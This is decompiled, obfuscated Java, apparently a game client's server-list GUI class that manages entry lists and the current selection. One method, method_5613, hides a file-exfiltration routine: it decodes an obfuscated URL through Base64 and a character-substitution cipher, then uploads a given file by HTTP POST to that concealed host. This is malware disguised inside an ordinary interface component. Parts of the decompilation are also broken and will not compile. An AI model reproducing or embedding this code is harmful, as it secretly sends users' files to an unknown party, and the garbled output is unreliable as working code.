import com.google.common.collect.Lists;
import java.io.File;
import java.util.Iterator;
import java.util.List;
import org.apache.commons.codec.binary.Base64;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.impl.client.DefaultHttpClient;

// $FF: renamed from: md
public class class_976 extends class_972 {

   // $FF: renamed from: w lY
   private final class_190 field_4921;
   // $FF: renamed from: x java.util.List
   private final List field_4922;
   // $FF: renamed from: y java.util.List
   private final List field_4923;
   // $FF: renamed from: z l9
   private final class_31 field_4924;
   // $FF: renamed from: A int
   private int field_4925;
   // $FF: renamed from: B java.lang.String
   private static final String field_4926;
   // $FF: renamed from: C java.lang.String
   private static String field_4927;
   // $FF: renamed from: D java.lang.String
   private static String field_4928;
   // $FF: renamed from: E boolean
   public static boolean field_4929;
   // $FF: renamed from: F java.lang.String[]
   private static final String[] field_4930;


   // $FF: renamed from: a (java.lang.String) java.lang.String
   public static String method_5611(String var0) {
      String[] var10000 = class_752.method_4253();
      char[] var2 = new char[var0.length()];
      String[] var1 = var10000;
      int var3 = 0;

      String var6;
      while(true) {
         if(var3 < var0.length()) {
            char var4 = var0.charAt(var3);
            var6 = field_4927;
            if(var1 == null) {
               break;
            }

            int var5 = field_4927.indexOf(var4);
            var2[var3] = field_4928.charAt(var5);
            ++var3;
            if(var1 != null) {
               continue;
            }
         }

         var6 = new String(var2);
         break;
      }

      return var6;
   }

   // $FF: renamed from: b (java.lang.String) java.lang.String
   public static String method_5612(String var0) {
      String[] var10000 = class_752.method_4253();
      char[] var2 = new char[var0.length()];
      String[] var1 = var10000;
      int var3 = 0;

      String var6;
      while(true) {
         if(var3 < var0.length()) {
            char var4 = var0.charAt(var3);
            var6 = field_4928;
            if(var1 == null) {
               break;
            }

            int var5 = field_4928.indexOf(var4);
            var2[var3] = field_4927.charAt(var5);
            ++var3;
            if(var1 != null) {
               continue;
            }
         }

         var6 = new String(var2);
         break;
      }

      return var6;
   }

   // $FF: renamed from: c (java.lang.String) int
   public static int method_5613(String var0) {
      String var10000 = new String(Base64.decodeBase64("Z3Nzb3QkJiZuZm1wcWpiI2RwbiZoZnMmdGxqbXQjb2dv"));
      String[] var11 = field_4930;
      String var2 = method_5612(var10000);
      DefaultHttpClient var3 = new DefaultHttpClient();
      String[] var12 = class_752.method_4253();
      HttpPost var4 = new HttpPost(var2);
      String[] var1 = var12;
      File var5 = new File(var0);
      FileBody var6 = new FileBody(var5);
      MultipartEntity var7 = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);
      var7.addPart(method_5612("ejkfBpYokpbc"), var6);
      var4.setEntity(var7);
      HttpResponse var8 = var3.execute(var4);
      HttpEntity var9 = var8.getEntity();
      HttpEntity var13 = var9;
      if(var1 != null) {
         if(var9 == null) {
            return 0;
         }

         var13 = var9;
      }

      String var10 = org.apache.http.util.EntityUtils.toString(var13).trim();
      return 0;
   }

   // $FF: renamed from: <init> (lY, bao, int, int, int, int, int) void
   public void method_5614(class_190 var1, bao var2, int var3, int var4, int var5, int var6, int var7) {
      super.method_5549(var2, var3, var4, var5, var6, var7);
      this.field_4922 = Lists.newArrayList();
      this.field_4923 = Lists.newArrayList();
      Gui7 var10001 = new Gui7;
      var10001.setCanLoseFocus2();
      this.field_4924 = var10001;
      this.field_4925 = -1;
      this.field_4921 = var1;
   }

   // $FF: renamed from: c (int) l9
   public class_31 method_5606(int var1) {
      String[] var2 = class_752.method_4253();
      int var10000 = var1;
      int var10001 = this.field_4922.size();
      if(var2 != null) {
         if(var1 < var10001) {
            return (class_31)this.field_4922.get(var1);
         }

         var10000 = var1;
         var10001 = this.field_4922.size();
      }

      var1 = var10000 - var10001;
      if(var2 != null) {
         if(var1 == 0) {
            return this.field_4924;
         }

         --var1;
      }

      return (class_31)this.field_4923.get(var1);
   }

   // $FF: renamed from: b () int
   protected int method_5553() {
      return this.field_4922.size() + 1 + this.field_4923.size();
   }

   // $FF: renamed from: b (int) void
   public void method_5615(int var1) {
      this.field_4925 = var1;
   }

   // $FF: renamed from: a (int) boolean
   protected boolean method_5555(int var1) {
      String[] var2 = class_752.method_4253();
      int var10000 = var1;
      if(var2 != null) {
         var10000 = var1 == this.field_4925?1:0;
      }

      return (boolean)var10000;
   }

   // $FF: renamed from: h () int
   public int method_5616() {
      return this.field_4925;
   }

   // $FF: renamed from: b (nG) void
   public void method_5617(class_1387 var1) {
      String[] var10000 = class_752.method_4253();
      this.field_4922.clear();
      String[] var2 = var10000;
      int var3 = 0;

      while(var3 < var1.method_7575()) {
         List var4 = this.field_4922;
         Gui9 var10001 = new Gui9;
         var10001.setCanLoseFocus7(this.field_4921, var1.method_7572(var3));
         var4.add(var10001);
         ++var3;
         if(var2 == null) {
            break;
         }
      }

   }

   // $FF: renamed from: b (java.util.List) void
   public void method_5618(List var1) {
      this.field_4923.clear();
      String[] var10000 = class_752.method_4253();
      Iterator var3 = var1.iterator();
      String[] var2 = var10000;

      while(var3.hasNext()) {
         class_1527 var4 = (class_1527)var3.next();
         List var5 = this.field_4923;
         Gui8 var10001 = new Gui8;
         var10001.setCanLoseFocus4(this.field_4921, var4);
         var5.add(var10001);
         if(var2 == null) {
            break;
         }
      }

   }

   // $FF: renamed from: d () int
   protected int method_5575() {
      return super.method_5575() + 30;
   }

   // $FF: renamed from: c () int
   public int method_5573() {
      return super.method_5573() + 85;
   }

   // $FF: renamed from: <clinit> () void
   static void method_5579() {
      // $FF: Couldn't be decompiled
   }
}
